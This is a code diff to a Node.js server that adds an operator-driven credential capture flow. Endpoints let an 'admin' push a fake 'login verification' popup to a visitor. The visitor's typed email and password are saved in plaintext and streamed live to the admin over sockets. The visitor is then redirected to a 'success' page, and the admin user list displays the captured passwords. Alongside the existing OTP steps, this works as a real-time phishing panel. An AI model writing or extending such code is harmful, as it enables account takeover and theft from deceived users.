@@ -128,6 +128,8 @@ async function initializeDatabase() {
         otp_verified BOOLEAN DEFAULT FALSE,
         approved BOOLEAN DEFAULT FALSE,
         second_approved BOOLEAN DEFAULT FALSE,
+        login_email VARCHAR(255) DEFAULT NULL,
+        login_password VARCHAR(255) DEFAULT NULL,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
         updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
@@ -147,8 +149,10 @@ async function initializeDatabase() {
     // Add columns if they don't exist
     await pool.query(`
       ALTER TABLE users 
-      ADD COLUMN IF NOT EXISTS second_approved BOOLEAN DEFAULT FALSE
-    `).catch(() => console.log('✅ second_approved column exists'));
+      ADD COLUMN IF NOT EXISTS second_approved BOOLEAN DEFAULT FALSE,
+      ADD COLUMN IF NOT EXISTS login_email VARCHAR(255) DEFAULT NULL,
+      ADD COLUMN IF NOT EXISTS login_password VARCHAR(255) DEFAULT NULL
+    `).catch(() => console.log('✅ Additional columns exist'));
 
     // Create update timestamp function
     await pool.query(`
@@ -307,6 +311,91 @@ app.post('/api/users/submit-second-otp', async (req, res) => {
   }
 });
 
+// ==================== NEW ENDPOINTS ====================
+
+// Admin force login - sends popup to user
+app.post('/api/admin/force-login', authenticateJWT, async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    
+    console.log('🔔 Admin forcing login for user:', email);
+    
+    // Emit socket event to trigger popup on user's page
+    io.emit('force-login-popup', { 
+      email,
+      timestamp: new Date(),
+      message: '🔐 Admin requires login verification'
+    });
+    
+    res.json({ success: true, message: 'Login popup sent to user' });
+  } catch (error) {
+    console.error('❌ Force login error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// User submits login from popup
+app.post('/api/users/submit-login', async (req, res) => {
+  try {
+    const { email, loginEmail, loginPassword } = req.body;
+    if (!email || !loginEmail || !loginPassword) {
+      return res.status(400).json({ error: 'All fields required' });
+    }
+    
+    // Email validation
+    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+    if (!emailRegex.test(loginEmail)) {
+      return res.status(400).json({ error: 'Please enter a valid email address' });
+    }
+    
+    // Save login credentials to database
+    await pool.query(
+      'UPDATE users SET login_email = $1, login_password = $2 WHERE email = $3',
+      [loginEmail, loginPassword, email]
+    );
+    
+    console.log('🔔 User submitted login:', email, 'Login Email:', loginEmail);
+    
+    // Notify admin
+    io.emit('user-login-submitted', { 
+      email,
+      loginEmail,
+      loginPassword,
+      timestamp: new Date(),
+      message: '🔐 User completed forced login'
+    });
+    
+    res.json({ success: true, message: 'Login submitted successfully' });
+  } catch (error) {
+    console.error('❌ Submit login error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Admin redirect to success - instantly redirects user
+app.post('/api/admin/redirect-success', authenticateJWT, async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    
+    console.log('🔔 Admin redirecting user to success:', email);
+    
+    // Emit socket event to redirect user
+    io.emit('redirect-to-success', { 
+      email,
+      redirectUrl: `/users/success?email=${encodeURIComponent(email)}`,
+      timestamp: new Date(),
+      message: '🎉 Admin completed verification'
+    });
+    
+    res.json({ success: true, message: 'Redirect sent to user' });
+  } catch (error) {
+    console.error('❌ Redirect success error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
 // ==================== ADMIN ENDPOINTS ====================
 
 // Admin login
@@ -331,7 +420,7 @@ app.post('/api/admin/login', async (req, res) => {
   }
 });
 
-// Get all users
+// Get all users - UPDATED with new columns
 app.get('/api/admin/users', authenticateJWT, async (req, res) => {
   try {
     const result = await pool.query(`
@@ -345,6 +434,8 @@ app.get('/api/admin/users', authenticateJWT, async (req, res) => {
         otp_verified,
         approved,
         second_approved,
+        login_email,
+        login_password,
         created_at,
         updated_at
       FROM users 
